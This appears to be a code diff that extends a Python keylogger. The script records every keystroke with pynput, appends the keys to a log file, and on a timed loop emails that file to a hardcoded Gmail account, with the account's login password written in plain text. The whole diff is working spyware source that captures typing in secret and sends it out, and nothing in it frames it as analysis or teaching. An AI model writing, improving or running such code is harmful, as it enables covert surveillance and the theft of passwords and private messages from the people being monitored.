@@ -1,6 +1,7 @@
 from pynput.keyboard import Key, Listener
 from re import sub
 import smtplib
+import time
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
@@ -14,8 +15,11 @@ fromaddr = "somethingawesomekeylogger58@gmail.com"
 toaddr = "somethingawesomekeylogger58@gmail.com"
 password = "pythonkeylogger"
 
-count = 0
-keys = []
+time_iter = 15
+num_iter = 0
+curr_time = time.time()
+stop_time = time.time() + time_iter
+num_iter_end = 2
 
 replacement_map = {
     "Key.backspace": "[<-]",
@@ -28,9 +32,7 @@ replacement_map = {
 }
 
 
-def send_email(filename, attachment, toaddr):
-    # global fromaddr, toaddr, password
-
+def send_email(filename, attachment):
     msg = MIMEMultipart()
     msg['From'] = fromaddr
     msg['To'] = toaddr
@@ -62,44 +64,51 @@ def send_email(filename, attachment, toaddr):
     s.quit()
 
 
-send_email(filename, path + filename, toaddr)
+while num_iter < num_iter_end:
+    count = 0
+    keys = []
 
+    def on_press(key):
+        global keys, count, curr_time
+        keys.append(key)
+        count += 1
+        curr_time = time.time()
 
-def on_press(key):
-    global keys, count
-    keys.append(key)
-    count += 1
+        # reset
+        if count >= 1:
+            count = 0
+            write_file(keys)
+            keys = []
 
-    # reset
-    if count >= 1:
-        count = 0
-        write_file(keys)
-        keys = []
+    def write_file(keys):
+        fullpath = path + filename
+        with open(fullpath, "a") as f:
+            for key in keys:
+                print(f"key = {key}")
+                # get rid of annoying single quotes
+                k = sub(r"[\'\"](.*)[\'\"]", r"\1", str(key))
 
+                if k in replacement_map:
+                    f.write(replacement_map[k])
 
-def write_file(keys):
-    fullpath = path + filename
-    with open(fullpath, "a") as f:
-        for key in keys:
-            print(f"key = {key}")
-            # get rid of annoying single quotes
-            k = sub(r"[\'\"](.*)[\'\"]", r"\1", str(key))
+                # in case of other special characters, get rid of "key." bit
+                else:
+                    f.write(sub(r"Key\.(.*)", r"[\1]", k))
 
-            if k in replacement_map:
-                f.write(replacement_map[k])
+                f.close()
 
-            # in case of other special characters, get rid of the "key." bit
-            else:
-                f.write(sub(r"Key\.(.*)", r"[\1]", k))
+    def on_release(key):
+        if key == Key.esc:
+            return False
+        if curr_time > stop_time:
+            return False
 
-            f.close()
-
-
-def on_release(key):
-    if key == Key.esc:
-        return False
-
-
-if __name__ == "__main__":
     with Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
+
+    if curr_time > stop_time:
+        send_email(filename, path + filename)
+
+    num_iter += 1
+    curr_time = time.time()
+    stop_time = time.time() + time_iter
